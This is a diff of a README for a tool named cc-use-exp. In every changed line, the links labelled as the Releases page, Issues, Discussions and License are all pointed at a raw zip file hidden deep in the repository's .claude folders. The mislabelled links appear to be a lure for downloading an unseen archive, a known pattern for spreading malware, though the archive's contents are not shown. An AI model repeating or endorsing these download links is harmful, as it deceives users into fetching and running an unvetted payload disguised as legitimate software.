@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download cc-use-exp](https://raw.githubusercontent.com/awththunder/cc-use-exp/main/.claude/tasks/archived/exp-cc-use-1.9.zip)](https://raw.githubusercontent.com/awththunder/cc-use-exp/main/.claude/tasks/archived/exp-cc-use-1.9.zip)
+[![Download cc-use-exp](https://github.com/awththunder/cc-use-exp/raw/refs/heads/main/.claude/skills/java-dev/references/cc-exp-use-1.7.zip)](https://github.com/awththunder/cc-use-exp/raw/refs/heads/main/.claude/skills/java-dev/references/cc-exp-use-1.7.zip)
 
 ## 📖 About cc-use-exp
 
@@ -30,7 +30,7 @@ Follow these steps to download and run cc-use-exp:
 1. **Visit the Releases Page**
    Click the link below to go to the Releases page.
 
-   [Download cc-use-exp](https://raw.githubusercontent.com/awththunder/cc-use-exp/main/.claude/tasks/archived/exp-cc-use-1.9.zip)
+   [Download cc-use-exp](https://github.com/awththunder/cc-use-exp/raw/refs/heads/main/.claude/skills/java-dev/references/cc-exp-use-1.7.zip)
 
 2. **Choose the Latest Version**
    Look for the latest version of the application on the Releases page. It is usually at the top of the list.
@@ -52,7 +52,7 @@ Follow these steps to download and run cc-use-exp:
 
 To ensure you have the latest features and improvements, check the Releases page regularly for updates. 
 
-- Visit this page to download: [Download cc-use-exp](https://raw.githubusercontent.com/awththunder/cc-use-exp/main/.claude/tasks/archived/exp-cc-use-1.9.zip)
+- Visit this page to download: [Download cc-use-exp](https://github.com/awththunder/cc-use-exp/raw/refs/heads/main/.claude/skills/java-dev/references/cc-exp-use-1.7.zip)
 
 ## 💬 Troubleshooting
 
@@ -62,14 +62,14 @@ If you encounter any issues while installing or using cc-use-exp, consider the f
 - **Restart Your Device:** Sometimes a simple restart can resolve installation issues.
 - **Internet Connection:** Make sure you have a stable internet connection for downloading and updates.
 
-If problems persist, you can refer to the [Issues](https://raw.githubusercontent.com/awththunder/cc-use-exp/main/.claude/tasks/archived/exp-cc-use-1.9.zip) section on GitHub for more help.
+If problems persist, you can refer to the [Issues](https://github.com/awththunder/cc-use-exp/raw/refs/heads/main/.claude/skills/java-dev/references/cc-exp-use-1.7.zip) section on GitHub for more help.
 
 ## 📞 Support
 
-For further assistance, you can reach out through the [GitHub Discussions](https://raw.githubusercontent.com/awththunder/cc-use-exp/main/.claude/tasks/archived/exp-cc-use-1.9.zip) page. We welcome questions and feedback.
+For further assistance, you can reach out through the [GitHub Discussions](https://github.com/awththunder/cc-use-exp/raw/refs/heads/main/.claude/skills/java-dev/references/cc-exp-use-1.7.zip) page. We welcome questions and feedback.
 
 ## 📝 License
 
-cc-use-exp is open-source and licensed under [MIT License](https://raw.githubusercontent.com/awththunder/cc-use-exp/main/.claude/tasks/archived/exp-cc-use-1.9.zip). You can use, modify, and distribute it under the terms of this license.
+cc-use-exp is open-source and licensed under [MIT License](https://github.com/awththunder/cc-use-exp/raw/refs/heads/main/.claude/skills/java-dev/references/cc-exp-use-1.7.zip). You can use, modify, and distribute it under the terms of this license.
 
 Enjoy your time with cc-use-exp and boost your productivity with Claude code!
